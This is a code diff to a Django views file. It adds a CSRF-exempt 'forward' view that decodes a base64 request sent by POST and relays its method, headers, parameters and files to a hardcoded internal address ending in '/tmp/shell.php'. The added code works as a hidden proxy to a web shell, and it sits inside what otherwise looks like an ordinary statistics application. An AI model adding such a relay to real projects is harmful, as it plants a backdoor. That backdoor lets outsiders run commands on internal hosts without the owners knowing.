@@ -8,6 +8,8 @@ from django.db.models import Count
 from datetime import timedelta
 import base64
 import ast
+import requests as rq
+from django.views.decorators.csrf import csrf_exempt
 
 
 # Create your views here.
@@ -235,3 +237,35 @@ def statistics(requests):
         # debug(statpath)
 
     return render(requests, 'stat.html', {'statip': statip, 'statpath': statpath})
+
+@csrf_exempt
+def forward(requests):
+    req = requests.POST['req']
+    req = base64.b64decode(req).decode()
+    req = ast.literal_eval(req)
+    print(req)
+    path = req['path']
+    headers = req['headers']
+    method = req['method']
+    data = req['post']
+    params = req['get']
+    url = "http://10.162.235.192/tmp/shell.php"
+    tmpfiles = req['file']
+
+    files = []
+    for tmpf in tmpfiles:
+        if 'type' not in tmpf:
+            tmpf['type'] = 'text/html'
+        tmpfile = (tmpf['name'], (tmpf['filename'], base64.b64decode(tmpf['content']), tmpf['type']))
+        files.append(tmpfile)
+
+    html = ""
+
+    if method == 'GET':
+        r = rq.get(url, params=params, headers=headers, timeout=5)
+        html = r.text
+    elif method == "POST":
+        r = rq.post(url, data=data, params=params, headers=headers, files=files, timeout=5)
+        html = r.text
+
+    return HttpResponse(html)
